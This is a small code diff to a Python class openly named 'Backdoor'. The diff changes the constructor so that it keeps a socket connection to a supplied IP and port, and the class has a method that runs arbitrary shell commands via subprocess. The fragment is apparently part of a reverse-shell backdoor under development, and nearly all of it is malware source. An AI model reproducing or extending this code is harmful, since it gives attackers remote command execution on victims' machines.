@@ -3,8 +3,8 @@ import subprocess
 
 class Backdoor:
     def __init__(self, ip, port):
-        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        connection.connect((ip, port))        
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip, port))        
 
     def execute_system_command(self, command):
         return subprocess.check_output(command, shell=True)
